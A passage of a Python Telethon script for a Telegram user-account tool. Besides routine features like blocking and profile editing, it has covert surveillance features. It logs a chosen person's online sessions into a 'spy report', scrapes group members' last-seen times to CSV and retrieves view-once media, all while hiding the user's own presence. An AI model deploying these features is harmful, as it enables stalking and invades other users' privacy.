                                print(col(f"  [{now}]  '{kw}' in [{d.name}]"
                                          f" → queued reply at {send_at_ist} IST", Fore.GREEN))
                                break
            except Exception:
                pass
            await asyncio.sleep(15)
    except KeyboardInterrupt:
        pass
    print()
    success(f"Bot stopped.  {len(seen)} replies queued.  👻 Last seen untouched.")
    await go_offline(client)
    press_enter()


async def feat_bulk_send(client, accent):
    """23. Bulk Send — loop: send another batch."""
    while True:
        clear()
        header("BULK SEND  📢")
        text = prompt("Message to send  (same to all recipients — blank = back)")
        if not text:
            return

        info("Loading contacts…")
        await go_offline(client)
        dialogs  = await client.get_dialogs(limit=100)
        await go_offline(client)
        contacts = [d for d in dialogs
                    if not getattr(d.entity, "megagroup", False)
                    and not getattr(d.entity, "broadcast", False)]
        clear()
        header("BULK SEND  —  pick recipients")
        print(col("  Enter numbers one by one.  Blank when done.\n", Fore.WHITE + Style.DIM))
        for i, d in enumerate(contacts):
            print(col(f"  {i:>3}.  {d.name}", Fore.WHITE))

        recipients = []
        seen_ids   = set()
        while True:
            raw = prompt("Add recipient number  (blank = done)")
            if not raw:
                break
            try:
                d = contacts[int(raw)]
                if d.id not in seen_ids:
                    recipients.append(d); seen_ids.add(d.id)
                    success(f"Added: {d.name}")
            except (ValueError, IndexError):
                error("Invalid number")

        if not recipients:
            warn("No recipients selected."); press_enter()
            nxt = again_menu("Start a new bulk send")
            if nxt is None: return
            continue

        print(col(f"\n  Ready to send to  {len(recipients)}  contact(s):", Fore.CYAN + Style.BRIGHT))
        for d in recipients:
            print(col(f"    • {d.name}", Fore.WHITE))
        if prompt(f"\n  Confirm send?  (y / N)").lower() != "y":
            warn("Cancelled.")
        else:
            ok = fail = 0
            for d in recipients:
                try:
                    send_at     = auto_schedule()
                    send_at_ist = send_at.astimezone(IST).strftime("%H:%M")
                    await go_offline(client)
                    await client.send_message(d.entity, text, schedule=send_at)
                    await go_offline(client)
                    ok += 1
                    print(col(f"  ✓  {d.name}  →  {send_at_ist} IST", Fore.GREEN))
                except Exception as e:
                    fail += 1
                    print(col(f"  ✗  {d.name}  →  {e}", Fore.RED))
            print()
            success(f"Done!  {ok} queued  ·  {fail} failed  ·  👻 Last seen untouched.")

        nxt = again_menu("Send another batch")
        if nxt is None:
            return


async def feat_block(client, accent):
    """24. Block / Unblock — loop: manage another contact."""
    while True:
        clear()
        header("BLOCK / UNBLOCK  🚫")
        query = prompt("@username or +phone  (blank = back)")
        if not query:
            return
        await go_offline(client)
        try:
            entity = await client.get_entity(query)
        except Exception as e:
            error(f"Not found: {e}"); press_enter(); continue

        name = (getattr(entity, "first_name", None) or
                getattr(entity, "title", str(query)))
        try:
            blocked     = await client(GetBlockedRequest(offset=0, limit=100))
            blocked_ids = {u.id for u in getattr(blocked, "users", [])}
            is_blocked  = entity.id in blocked_ids
        except Exception:
            is_blocked = False

        label = col("🔴 BLOCKED", Fore.RED) if is_blocked else col("🟢 not blocked", Fore.GREEN)
        print(col(f"\n  {name}  is currently  ", Fore.WHITE) + label)
        print()
        print(col("  1.  Block this contact",   Fore.RED))
        print(col("  2.  Unblock this contact", Fore.GREEN))
        print(col("  3.  Check another contact", Fore.WHITE + Style.DIM))
        print(col("  4.  Back to main menu",    Fore.WHITE + Style.DIM))
        choice = prompt("Choose")

        try:
            await go_offline(client)
            if choice == "1":
                if prompt(f"Block  {name}?  (y / N)").lower() != "y":
                    warn("Cancelled.")
                else:
                    await client(BlockRequest(id=entity))
                    await go_offline(client)
                    success(f"{name}  →  BLOCKED.  They can no longer message you.")
            elif choice == "2":
                if prompt(f"Unblock  {name}?  (y / N)").lower() != "y":
                    warn("Cancelled.")
                else:
                    await client(UnblockRequest(id=entity))
                    await go_offline(client)
                    success(f"{name}  →  UNBLOCKED.  They can message you again.")
            elif choice == "3":
                continue
            elif choice == "4":
                return
            else:
                warn("Cancelled.")
        except Exception as e:
            error(f"Failed: {e}")

        press_enter()


# ═══════════════════════════════════════════════════════════════
#  FEATURES — EXTREME / DEEP INTEL
# ═══════════════════════════════════════════════════════════════

async def feat_pattern_analyze(client, accent):
    """25. Online Pattern Analyzer (timed spy report)."""
    clear()
    header("ONLINE PATTERN ANALYZER  📊")
    query = prompt("@username or +phone to analyze  (blank = back)")
    if not query:
        return
    await go_offline(client)
    try:
        entity = await client.get_entity(query)
    except Exception as e:
        error(f"Not found: {e}"); press_enter(); return

    mins_s   = prompt("Analyze for how many minutes?  (default 30)")
    mins     = int(mins_s) if mins_s.isdigit() else 30
    name     = getattr(entity, "first_name", None) or getattr(entity, "title", str(query))
    clear()
    header(f"📊  Analyzing  {name}  for {mins} min")
    info("Checking every 10 s.  Ctrl+C to stop early and generate report.")
    print()
    sessions     = []
    online_start = None
    loop = asyncio.get_running_loop()
    end  = loop.time() + mins * 60
    try:
        while loop.time() < end:
            await go_offline(client)
            try:
                u   = await client.get_entity(entity.id)
                stn = type(u.status).__name__
                now = datetime.now(IST)
                ts  = now.strftime("%H:%M:%S")
                if stn == "UserStatusOnline":
                    if online_start is None:
                        online_start = now
                        print(col(f"  [{ts}]  🟢  {name} ONLINE", Fore.GREEN + Style.BRIGHT))
                    else:
                        print(col(f"  [{ts}]  🟢  still online…", Style.DIM), end="\r")
                else:
                    if online_start is not None:
                        dur = int((now - online_start).total_seconds())
                        sessions.append((online_start, now, dur))
                        print(col(f"\n  [{ts}]  ⚫  offline  ({dur//60}m {dur%60}s session)", Fore.RED))
                        online_start = None
                    else:
                        print(col(f"  [{ts}]  ⚫  offline", Style.DIM), end="\r")
            except Exception:
                pass
            await asyncio.sleep(10)
    except KeyboardInterrupt:
        pass

    if online_start is not None:
        now = datetime.now(IST)
        sessions.append((online_start, now, int((now - online_start).total_seconds())))
    print()
    clear()
    header(f"📊  PATTERN REPORT  —  {name}")
    if not sessions:
        warn("Not seen online during this window.")
        await go_offline(client); press_enter(); return

    total = sum(s[2] for s in sessions)
    avg   = total // len(sessions)
    print(col(f"\n  Sessions observed   :  {len(sessions)}", Fore.WHITE))
    print(col(f"  Total online time   :  {total//60}m {total%60}s", Fore.WHITE))
    print(col(f"  Avg session length  :  {avg//60}m {avg%60}s",    Fore.WHITE))
    print()
    for i, (st, en, dur) in enumerate(sessions):
        print(col(f"  Session {i+1:>2}:  {st.strftime('%H:%M:%S')}  →  "
                  f"{en.strftime('%H:%M:%S')}  ({dur//60}m {dur%60}s)", Fore.CYAN))

    safe  = "".join(c if c.isalnum() or c in "_-" else "_" for c in name)
    rfile = f"pattern_{safe}_{datetime.now(IST).strftime('%Y%m%d_%H%M')}.txt"
    with open(rfile, "w", encoding="utf-8") as f:
        f.write(f"Online Pattern Report — {name}\n")
        f.write(f"Generated: {datetime.now(IST).strftime('%Y-%m-%d %H:%M IST')}\n")
        f.write(f"Sessions observed: {len(sessions)}\n")
        f.write(f"Total online: {total//60}m {total%60}s\n")
        f.write(f"Avg session: {avg//60}m {avg%60}s\n\n")
        for i, (st, en, dur) in enumerate(sessions):
            f.write(f"Session {i+1}: {st.strftime('%H:%M:%S')} → "
                    f"{en.strftime('%H:%M:%S')} ({dur//60}m {dur%60}s)\n")
    success(f"\n  Report saved  →  {rfile}")
    await go_offline(client)
    press_enter()


async def feat_keyword_alert(client, accent):
    """26. Real-Time Keyword Alert (timed monitor)."""
    clear()
    header("KEYWORD ALERT  ⚡")
    kw = prompt("Keyword to watch for  (all chats — blank = back)")
    if not kw:
        return
    mins_s = prompt("Monitor for how many minutes?  (default 15)")
    mins   = int(mins_s) if mins_s.isdigit() else 15
    clear()
    header(f"⚡  WATCHING for  '{kw}'")
    info(f"Scanning every 15 s for {mins} min.  Ctrl+C to stop.")
    print()
    loop  = asyncio.get_running_loop()
    end   = loop.time() + mins * 60
    seen  = set()
    found = 0
    kw_l  = kw.lower()
    try:
        while loop.time() < end:
            await go_offline(client)
            try:
                dialogs = await client.get_dialogs(limit=100)
                for d in dialogs:
                    msgs = await client.get_messages(d.entity, limit=5)
                    await go_offline(client)
                    for m in msgs:
                        key = (d.id, m.id)
                        if key in seen:
                            continue
                        seen.add(key)
                        if kw_l in (m.text or "").lower():
                            found += 1
                            sndr = "You" if m.out else (
                                getattr(m.sender, "first_name", None) or d.name)
                            ts = datetime.now(IST).strftime("%H:%M:%S")
                            print(col(f"\n  🚨  [{ts}]  MATCH in [{d.name}]",
                                      Fore.RED + Style.BRIGHT))
                            print(col(f"       From : {sndr}", Fore.YELLOW))
                            print(col(f"       Text : {trunc(m.text, 80)}", Fore.WHITE))
            except Exception:
                pass
            await asyncio.sleep(15)
    except KeyboardInterrupt:
        pass
    print()
    success(f"Alert ended.  {found} match(es) found.")
    await go_offline(client)
    press_enter()


async def feat_nuclear_delete(client, accent):
    """27. Nuclear Delete — loop: nuke another chat after each run."""
    while True:
        clear()
        header("NUCLEAR DELETE  ☢️")
        warn("Deletes ALL your messages in a chat.  CANNOT BE UNDONE!")
        print()
        selected, _ = await pick_dialog(client, accent)
        if not selected:
            return

        print(col(f"\n  ⚠️   DELETE all YOUR messages in  [{selected.name}]  for EVERYONE?", Fore.RED + Style.BRIGHT))
        print(col("       This action is permanent and cannot be reversed.", Fore.RED))
        if prompt("Type  YES  to confirm  (anything else = cancel)") != "YES":
            warn("Cancelled.")
        else:
            n_s = prompt("Scan how many messages back?  (default 1000)")
            n   = int(n_s) if n_s.isdigit() else 1000
            info(f"Loading {n} messages…")
            await go_offline(client)
            msgs    = await client.get_messages(selected.entity, limit=n)
            await go_offline(client)
            my_msgs = [m for m in msgs if m.out]
            if not my_msgs:
                warn("No messages from you found.")
            else:
                ok = fail = 0
                for i in range(0, len(my_msgs), 100):
                    chunk = my_msgs[i:i+100]
                    try:
                        await go_offline(client)
                        await client.delete_messages(selected.entity,
                                                     [m.id for m in chunk], revoke=True)
                        await go_offline(client)
                        ok += len(chunk)
                        print(col(f"  ☢️   Deleted {ok}/{len(my_msgs)}…", Fore.RED), end="\r")
                    except Exception as e:
                        fail += len(chunk)
                print()
                success(f"\n  {ok} deleted  ·  {fail} failed  ·  👻 Invisible throughout.")

        nxt = again_menu("Nuke another chat")
        if nxt is None:
            return


async def feat_group_scraper(client, accent):
    """28. Group Member Scraper (→ CSV) — loop: scrape another group."""
    while True:
        clear()
        header("GROUP MEMBER SCRAPER  👥")
        selected, _ = await pick_dialog(client, accent)
        if not selected:
            return

        info(f"Scraping [{selected.name}]…  (may take a moment for large groups)")
        await go_offline(client)
        try:
            members = await client.get_participants(selected.entity, aggressive=True)
            await go_offline(client)
        except Exception as e:
            error(f"Could not scrape: {e}"); press_enter()
            nxt = again_menu("Try a different group")
            if nxt is None: return
            continue

        clear()
        header(f"👥  {selected.name}  —  {len(members)} members")
        print()
        for i, m in enumerate(members[:25]):
            nm  = (m.first_name or "") + (" " + m.last_name if m.last_name else "")
            un  = "@" + m.username if m.username else "—"
            stn = type(m.status).__name__ if m.status else ""
            if   stn == "UserStatusOnline":       ls = "🟢 online"
            elif stn == "UserStatusRecently":      ls = "recently"
            elif hasattr(m.status, "was_online"): ls = to_ist(m.status.was_online)
            else:                                  ls = "hidden"
            print(col(f"  {i+1:>4}.  {nm:<22}  {un:<20}  {ls}", Fore.WHITE))
        if len(members) > 25:
            print(col(f"\n  … {len(members)-25} more in CSV", Style.DIM))

        safe  = "".join(c if c.isalnum() or c in "_-" else "_" for c in selected.name)
        cfile = f"members_{safe}_{datetime.now(IST).strftime('%Y%m%d_%H%M')}.csv"
        with open(cfile, "w", encoding="utf-8") as f:
            f.write("id,name,username,last_seen,type\n")
            for m in members:
                nm  = ((m.first_name or "") + (" " + m.last_name if m.last_name else "")
                       ).replace(",", " ")
                un  = ("@" + m.username) if m.username else ""
                stn = type(m.status).__name__ if m.status else ""
                if   stn == "UserStatusOnline":       ls = "online"
                elif stn == "UserStatusRecently":      ls = "recently"
                elif hasattr(m.status, "was_online"):  ls = m.status.was_online.isoformat()
                else:                                  ls = "hidden"
                f.write(f"{m.id},{nm},{un},{ls},{'bot' if m.bot else 'user'}\n")
        success(f"\n  {len(members)} members saved  →  {cfile}")

        nxt = again_menu("Scrape another group")
        if nxt is None:
            return


async def feat_chat_stats(client, accent):
    """29. Chat Deep Stats — loop: analyze another chat."""
    while True:
        clear()
        header("CHAT DEEP STATS  📈")
        selected, _ = await pick_dialog(client, accent)
        if not selected:
            return

        n_s = prompt("Analyze how many messages?  (default 500)")
        n   = int(n_s) if n_s.isdigit() else 500
        info(f"Loading {n} messages…")
        await go_offline(client)
        msgs = await client.get_messages(selected.entity, limit=n)
        await go_offline(client)
        if not msgs:
            warn("No messages found."); press_enter()
            nxt = again_menu("Analyze another chat")
            if nxt is None: return
            continue

        my_c  = sum(1 for m in msgs if m.out)
        th_c  = len(msgs) - my_c
        med_c = sum(1 for m in msgs if m.media)
        hours = [0] * 24
        for m in msgs:
            hours[m.date.astimezone(IST).hour] += 1
        peak_h = hours.index(max(hours))
        dates  = [m.date for m in msgs]
        first  = min(dates).astimezone(IST).strftime("%d %b %Y")
        last   = max(dates).astimezone(IST).strftime("%d %b %Y")
        word_freq: dict = {}
        for m in msgs:
            if not m.out and m.text:
                for w in m.text.lower().split():
                    w = w.strip(".,!?;:\"'()[]{}\n")
                    if len(w) > 3:
                        word_freq[w] = word_freq.get(w, 0) + 1
        top_words  = sorted(word_freq.items(), key=lambda x: -x[1])[:10]
        resp_times = []
        prev       = None
        for m in reversed(msgs):
            if prev is not None and m.out != prev.out:
                diff = abs(int((m.date - prev.date).total_seconds()))
                if diff < 3600:
                    resp_times.append(diff)
            prev = m
        avg_r = (sum(resp_times) // len(resp_times)) if resp_times else 0

        clear()
        header(f"📈  STATS  —  {selected.name}")
        print(col(f"\n  Date range      :  {first}  →  {last}",       Fore.WHITE))
        print(col(f"  Messages scanned:  {len(msgs)}",                 Fore.WHITE))
        print(col(f"  Your messages   :  {my_c}  ({my_c*100//len(msgs)}%)",
                  Fore.CYAN))
        print(col(f"  Their messages  :  {th_c}  ({th_c*100//len(msgs)}%)",
                  Fore.WHITE))
        print(col(f"  Media / files   :  {med_c}",                     Fore.WHITE))
        print(col(f"  Peak hour (IST) :  {peak_h:02d}:00  ({hours[peak_h]} msgs)",
                  Fore.YELLOW))
        print(col(f"  Avg reply time  :  {avg_r//60}m {avg_r%60}s",   Fore.WHITE))
        if top_words:
            print(col(f"\n  Top words (their side):", Fore.CYAN + Style.BRIGHT))
            max_c = top_words[0][1]
            for w, c in top_words:
                bar = "█" * max(1, c * 16 // max_c)
                print(col(f"    {w:<16}  {bar} {c}", Fore.WHITE))
        await go_offline(client)

        nxt = again_menu("Analyze another chat")
        if nxt is None:
            return


async def feat_scheduled_queue(client, accent):
    """30. Scheduled Queue Manager — stays open, refresh list after each cancel."""
    while True:
        clear()
        header("SCHEDULED QUEUE  🗓️")
        selected, _ = await pick_dialog(client, accent)
        if not selected:
            return

        # Inner loop: stay in THIS chat's queue until user leaves
        while True:
            info(f"Loading scheduled messages for [{selected.name}]…")
            await go_offline(client)
            try:
                sched = list(await client.get_messages(selected.entity, scheduled=True))
                await go_offline(client)
            except Exception as e:
                error(f"Could not fetch: {e}"); press_enter(); break

            if not sched:
                warn("No scheduled messages in this chat."); press_enter(); break

            clear()
            header(f"🗓️  SCHEDULED  —  {selected.name}  ({len(sched)} pending)")
            print()
            for i, m in enumerate(sched):
                ts  = to_ist(m.date) if m.date else "?"
                txt = trunc(m.text or "[media]", 50)
                print(col(f"  {i:>3}.  [{ts}]  {txt}", Fore.WHITE))

            print()
            print(col("  Enter number to cancel one message.", Fore.YELLOW))
            print(col("  Enter  'all'  to cancel all pending messages.", Fore.RED))
            print(col("  Enter  blank  to pick a different chat.", Fore.WHITE + Style.DIM))
            choice = prompt("Choice")

            if not choice:
                break  # go back to outer loop (pick new chat)

            try:
                await go_offline(client)
                if choice.lower() == "all":
                    print(col(f"\n  ⚠️   Cancel ALL {len(sched)} scheduled message(s) in [{selected.name}]?",
                              Fore.RED + Style.BRIGHT))
                    if prompt("Confirm?  (y / N)").lower() != "y":
                        warn("Cancelled.")
                    else:
                        await client.delete_messages(selected.entity,
                                                     [m.id for m in sched], revoke=True)
                        await go_offline(client)
                        success(f"All {len(sched)} scheduled messages cancelled.")
                        press_enter()
                        break  # go pick new chat
                else:
                    idx_c = int(choice)
                    if idx_c < 0 or idx_c >= len(sched):
                        error("Number out of range."); press_enter(); continue
                    t       = sched[idx_c]
                    ts_str  = to_ist(t.date) if t.date else "?"
                    txt_str = trunc(t.text or "[media]", 40)
                    print(col(f"\n  ⚠️   Cancel  [{ts_str}]  '{txt_str}'?", Fore.YELLOW))
                    if prompt("Confirm?  (y / N)").lower() != "y":
                        warn("Cancelled.")
                    else:
                        await client.delete_messages(selected.entity, [t.id], revoke=True)
                        await go_offline(client)
                        success("Scheduled message cancelled.")
                        press_enter()
                        # Loop refreshes list automatically (continue inner while)
            except (ValueError, IndexError):
                error("Invalid number."); press_enter()
            except Exception as e:
                error(f"Failed: {e}"); press_enter()

        nxt = again_menu("Manage queue in another chat")
        if nxt is None:
            return


async def feat_self_destruct(client, accent):
    """31. Self-Destruct Message — loop: send another."""
    while True:
        clear()
        header("SELF-DESTRUCT MESSAGE  💣")
        selected, _ = await pick_dialog(client, accent)
        if not selected:
            return

        print(col(f"\n  To:  [{selected.name}]", Fore.CYAN + Style.BRIGHT))
        text = prompt("Message text  (blank = cancel)")
        if not text:
            warn("Cancelled.")
        else:
            del_s = prompt("Auto-delete after how many minutes?  (default 5)")
            del_m = int(del_s) if del_s.isdigit() else 5
            send_at     = auto_schedule()
            send_at_ist = send_at.astimezone(IST).strftime("%H:%M")
            delete_at   = send_at + timedelta(minutes=del_m)
            del_ist     = delete_at.astimezone(IST).strftime("%H:%M")
            try:
                await go_offline(client)
                msg = await client.send_message(selected.entity, text, schedule=send_at)
                await go_offline(client)
                success(f"Queued!  Sends at {send_at_ist}  →  💣 self-destructs at {del_ist} IST")
                warn("Keep this script running for auto-delete to fire.")

                async def _destroy():
                    wait_s = (delete_at - datetime.now(timezone.utc)).total_seconds()
                    if wait_s > 0:
                        await asyncio.sleep(wait_s)
                    try:
                        await go_offline(client)
                        try:
                            await client.delete_messages(selected.entity, [msg.id], revoke=True)
                        except Exception:
                            recent = await client.get_messages(selected.entity, limit=50)
                            for m in recent:
                                if m.out and m.text == text:
                                    await client.delete_messages(selected.entity,
                                                                 [m.id], revoke=True)
                                    break
                        await go_offline(client)
                        ts = datetime.now(IST).strftime("%H:%M IST")
                        print(col(f"\n  💣  Self-destructed at {ts}", Fore.RED + Style.BRIGHT))
                    except Exception:
                        pass

                asyncio.create_task(_destroy())
            except Exception as e:
                error(f"Failed: {e}")

        nxt = again_menu(
            f"Send another self-destruct to  [{selected.name}]",
            "Pick a different chat",
        )
        if nxt is None:
            return


async def feat_live_monitor(client, accent):
    """32. Live Monitor Mode (timed real-time chat watcher)."""
    clear()
    header("LIVE MONITOR MODE  📡")
    selected, _ = await pick_dialog(client, accent)
    if not selected:
        return

    mins_s = prompt("Monitor for how many minutes?  (default 10)")
    mins   = int(mins_s) if mins_s.isdigit() else 10
    clear()
    header(f"📡  LIVE  —  {selected.name}")
    info(f"Watching for {mins} min.  New messages appear as they arrive.  Ctrl+C to stop.")
    divider()
    await go_offline(client)
    init_msgs = await client.get_messages(selected.entity, limit=5)
    await go_offline(client)
    last_id = max((m.id for m in init_msgs), default=0)
    loop = asyncio.get_running_loop()
    end  = loop.time() + mins * 60
    try:
        while loop.time() < end:
            await go_offline(client)
            try:
                new_msgs = await client.get_messages(
                    selected.entity, limit=20, min_id=last_id)
                await go_offline(client)
                for m in reversed(new_msgs):
                    if m.id > last_id:
                        last_id = m.id
                        await render_msg(client, m)
                        divider()
            except Exception:
                pass
            await asyncio.sleep(5)
    except KeyboardInterrupt:
        pass
    print()
    success("Monitor stopped.  👻 Invisible throughout.")
    await go_offline(client)
    press_enter()


# ═══════════════════════════════════════════════════════════════
#  FEATURES — SECURITY / PROFILE
# ═══════════════════════════════════════════════════════════════

async def feat_devices(client, accent):
    """33. Active Devices — view, manage, and terminate sessions. Refreshes after each action."""
    while True:
        clear()
        header("ACTIVE DEVICES  🔒")
        info("Fetching active sessions from Telegram…")
        await go_offline(client)
        try:
            result = await client(GetAuthorizationsRequest())
            await go_offline(client)
        except Exception as e:
            error(f"Could not fetch sessions: {e}"); press_enter(); return

        auths = result.authorizations
        if not auths:
            warn("No active sessions found."); press_enter(); return

        clear()
        header(f"🔒  ACTIVE DEVICES  ({len(auths)} session(s))")
        print()

        for i, a in enumerate(auths):
            last_active = a.date_active.astimezone(IST).strftime("%d %b %Y  %H:%M IST")
            created_on  = a.date_created.astimezone(IST).strftime("%d %b %Y")
            tag         = col("  ◀ THIS DEVICE", Fore.GREEN + Style.BRIGHT) if a.current else ""
            idx_col     = col(f"  {i:>3}.", Fore.GREEN if a.current else accent)

            print(idx_col + col(f"  {a.device_model}", Fore.WHITE + Style.BRIGHT) + tag)
            print(col(f"       Platform    :  {a.platform}  {a.system_version}", Fore.WHITE))
            print(col(f"       App         :  {a.app_name}  v{a.app_version}",   Fore.WHITE))
            print(col(f"       IP          :  {a.ip}",                            Fore.YELLOW))
            print(col(f"       Location    :  {a.country}  /  {a.region}",        Fore.WHITE))
            print(col(f"       Last active :  {last_active}",                     Fore.CYAN))
            print(col(f"       Session since: {created_on}",                      Fore.WHITE + Style.DIM))
            print()

        other_count = sum(1 for a in auths if not a.current)
        print(col("  ─────────────────────────────────────────────", Fore.WHITE + Style.DIM))
        print(col("  Enter device number to terminate that session.", Fore.RED))
        if other_count > 0:
            print(col(f"  Enter  'other'  to terminate all {other_count} other session(s) at once.", Fore.RED))
        print(col("  Enter  blank   to go back.", Fore.WHITE + Style.DIM))
        print()

        choice = prompt("Terminate which?")
        if not choice:
            return

        await go_offline(client)
        try:
            if choice.lower() == "other":
                if other_count == 0:
                    warn("No other sessions to terminate."); press_enter(); continue
                print(col(f"\n  ⚠️   This will log out  {other_count}  other session(s) immediately.", Fore.RED + Style.BRIGHT))
                if prompt("Confirm?  (y / N)").lower() != "y":
                    warn("Cancelled."); press_enter(); continue
                ok = 0
                for a in auths:
                    if not a.current:
                        try:
                            await client(ResetAuthorizationRequest(hash=a.hash))
                            ok += 1
                        except Exception:
                            pass
                await go_offline(client)
                success(f"All {ok} other session(s) terminated.  Only this device remains.")
                press_enter()
                # Loop refreshes and shows updated list (should show only 1 now)

            else:
                idx = int(choice)
                if idx < 0 or idx >= len(auths):
                    error("Invalid number!"); press_enter(); continue
                target = auths[idx]
                if target.current:
                    error("Cannot terminate your own current session here!"); press_enter(); continue
                dev = target.device_model
                print(col(f"\n  ⚠️   Terminate  [{dev}]  in {target.country}?", Fore.RED + Style.BRIGHT))
                print(col("       That device will be logged out of Telegram immediately.", Fore.RED))
                if prompt("Confirm?  (y / N)").lower() != "y":
                    warn("Cancelled."); press_enter(); continue
                await client(ResetAuthorizationRequest(hash=target.hash))
                await go_offline(client)
                success(f"[{dev}] terminated.  That device is now logged out.")
                press_enter()
                # Loop refreshes and shows updated list

        except (ValueError, IndexError):
            error("Invalid input."); press_enter()
        except Exception as e:
            error(f"Failed: {e}"); press_enter()


async def feat_edit_profile(client, accent):
    """34. Edit My Profile — name, last name, bio, username. Loops, shows live state."""
    clear()
    header("EDIT MY PROFILE  ✏️")
    info("Fetching current profile…")
    await go_offline(client)
    try:
        me   = await client.get_me()
        full = await client(GetFullUserRequest(me))
        await go_offline(client)
    except Exception as e:
        error(f"Could not fetch profile: {e}"); press_enter(); return

    fname = me.first_name or ""
    lname = me.last_name  or ""
    bio   = full.full_user.about or ""
    uname = me.username or ""

    while True:
        clear()
        header("✏️  EDIT MY PROFILE")
        print(col("\n  Current profile:", Fore.CYAN + Style.BRIGHT))
        phone_str = f"+{me.phone}" if getattr(me, 'phone', None) else "(none)"
        print(col(f"  Account ID  :  {me.id}", Fore.WHITE))
        print(col(f"  Phone       :  {phone_str}", Fore.WHITE))
        print(col(f"  Premium     :  {'Yes' if getattr(me, 'premium', False) else 'No'}", Fore.WHITE))
        print(col(f"  First name  :  {fname or '(empty)'}",  Fore.WHITE))
        print(col(f"  Last name   :  {lname or '(empty)'}",  Fore.WHITE))
        print(col(f"  Bio         :  {trunc(bio, 60) or '(empty)'}",  Fore.WHITE))
        print(col(f"  Username    :  {'@'+uname if uname else '(none)'}",
                  Fore.CYAN if uname else Fore.WHITE + Style.DIM))
        print()
        print(col("  1.  Change first name",          Fore.WHITE))
        print(col("  2.  Change last name",            Fore.WHITE))
        print(col("  3.  Change bio / about",          Fore.WHITE))
        print(col("  4.  Change username",             Fore.WHITE))
        print(col("  5.  Edit everything at once",     Fore.WHITE))
        print(col("  6.  Back to main menu",           Fore.WHITE + Style.DIM))
        print()

        choice = prompt("Choose")
        if choice == "6" or not choice:
            return

        try:
            await go_offline(client)

            if choice == "1":
                new = prompt(f"New first name  (current: '{fname}')")
                if not new:
                    warn("No change."); press_enter(); continue
                await client(UpdateProfileRequest(first_name=new))
                await go_offline(client)
                fname = new
                success(f"First name  →  '{new}'")

            elif choice == "2":
                print(col(f"  Current last name:  {lname or '(empty)'}", Style.DIM))
                new = prompt("New last name  (blank = remove last name)")
                if not new and lname:
                    if prompt("Remove your last name entirely?  (y / N)").lower() != "y":
                        warn("No change."); press_enter(); continue
                await client(UpdateProfileRequest(last_name=new))
                await go_offline(client)
                lname = new
                success(f"Last name  →  '{new}'" if new else "Last name removed.")

            elif choice == "3":
                print(col(f"  Current bio:  {bio or '(empty)'}", Style.DIM))
                new = prompt("New bio  (up to 70 chars — blank = remove bio)")
                if not new and bio:
                    if prompt("Remove your bio entirely?  (y / N)").lower() != "y":
                        warn("No change."); press_enter(); continue
                await client(UpdateProfileRequest(about=new))
                await go_offline(client)
                bio = new
                success("Bio updated." if new else "Bio removed.")

            elif choice == "4":
                print(col("  5–32 chars, letters / numbers / underscore only.",
                           Fore.WHITE + Style.DIM))
                print(col(f"  Current: {'@'+uname if uname else 'none'}",
                           Fore.WHITE + Style.DIM))
                new = prompt("New username  (without @)  — blank = remove username")
                if not new and uname:
                    if prompt("Remove your @username?  (y / N)").lower() != "y":
                        warn("No change."); press_enter(); continue
                await client(UpdateUsernameRequest(username=new))
                await go_offline(client)
                uname = new
                success(f"Username  →  '@{new}'" if new else "Username removed.")

            elif choice == "5":
                print(col("  Leave a field blank to keep its current value.",
                           Fore.WHITE + Style.DIM))
                print(col("  Type  REMOVE  to clear a field.",
                           Fore.WHITE + Style.DIM))
                print()
                nf     = prompt(f"First name  [{fname}]") or fname
                nl_raw = prompt(f"Last name   [{lname}]  (REMOVE to clear)")
                nl     = "" if nl_raw.upper() == "REMOVE" else (nl_raw or lname)
                nb_raw = prompt(f"Bio         [{trunc(bio, 40)}]  (REMOVE to clear)")
                nb     = "" if nb_raw.upper() == "REMOVE" else (nb_raw or bio)
                nu_raw = prompt(f"Username    [{'@'+uname if uname else 'none'}]  (REMOVE to clear)")
                nu_change = nu_raw.upper() == "REMOVE" or (nu_raw and nu_raw != uname)

                await client(UpdateProfileRequest(first_name=nf, last_name=nl, about=nb))
                await go_offline(client)
                fname, lname, bio = nf, nl, nb

                if nu_change:
                    nu = "" if nu_raw.upper() == "REMOVE" else nu_raw
                    try:
                        await client(UpdateUsernameRequest(username=nu))
                        await go_offline(client)
                        uname = nu
                    except Exception as ue:
                        warn(f"Profile saved, but username error: {ue}")

                success("Profile updated successfully!")

            else:
                error("Invalid choice — enter 1 to 6"); press_enter(); continue

        except Exception as e:
            error(f"Failed: {e}")

        press_enter()
        # Loop continues — screen refreshes with updated values


# ═══════════════════════════════════════════════════════════════
#  MAIN VIEWER  (per-account session)
# ═══════════════════════════════════════════════════════════════



async def feat_media_catch_up(client, accent):
    """37. Specific Media Catch Up"""
    clear()
    header("SPECIFIC MEDIA CATCH UP  🕵️")
    print(col("  1.  Photos", Fore.WHITE))
    print(col("  2.  Videos", Fore.WHITE))
    print(col("  3.  Voice Notes (with Auto-Transcribe)", Fore.WHITE))
    print(col("  4.  Round Videos", Fore.WHITE))
    print(col("  5.  Documents", Fore.WHITE))
    print(col("  6.  Pinned Messages", Fore.WHITE))
    print(col("  7.  View Once Only (Secret Media)", Fore.WHITE))
    print(col("  8.  All Media (Everything)", Fore.WHITE))
    print()
    m_choice = prompt("Choose media type")
    
    filters = {
        "1": InputMessagesFilterPhotos,
        "2": InputMessagesFilterVideo,
        "3": InputMessagesFilterVoice,
        "4": InputMessagesFilterRoundVideo,
        "5": InputMessagesFilterDocument,
        "6": InputMessagesFilterPinned,
        "7": None,
        "8": None
    }
    
    if m_choice not in filters: return
    selected, _ = await pick_dialog(client, accent)
    if not selected: return
    
    info("Scanning chat...")
    await go_offline(client)
    
    msgs = []
    try:
        limit_count = 500 if m_choice in ("7", "8") else 50
        async for m in client.iter_messages(selected.entity, filter=filters[m_choice], limit=limit_count):
            if m_choice == "7" and not getattr(m.media, 'ttl_seconds', None):
                continue
            if m_choice == "8" and not getattr(m, 'file', None):
                continue
            msgs.append(m)
            if len(msgs) >= 50:
                break
    except Exception as e:
        error(str(e))
        press_enter()
        return

    if not msgs:
        warn("No media found.")
        press_enter()
        return
        
    while True:
        clear()
        header(f"MEDIA CATCH UP: {selected.name}")
        for i, m in enumerate(msgs):
            dt = m.date.astimezone(IST).strftime("%d/%m %H:%M")
            sender = await get_sender_name(client, m)
            secret = col(" [VIEW ONCE - SECRET]", Fore.RED) if getattr(m.media, 'ttl_seconds', None) else ""
            
            f_name, f_ext, f_size = None, None, 0
            if getattr(m, 'media', None) and getattr(m.media, 'webpage', None) and getattr(m.media.webpage, 'document', None):
                doc = m.media.webpage.document
                f_size = getattr(doc, 'size', 0)
                from telethon.utils import get_extension
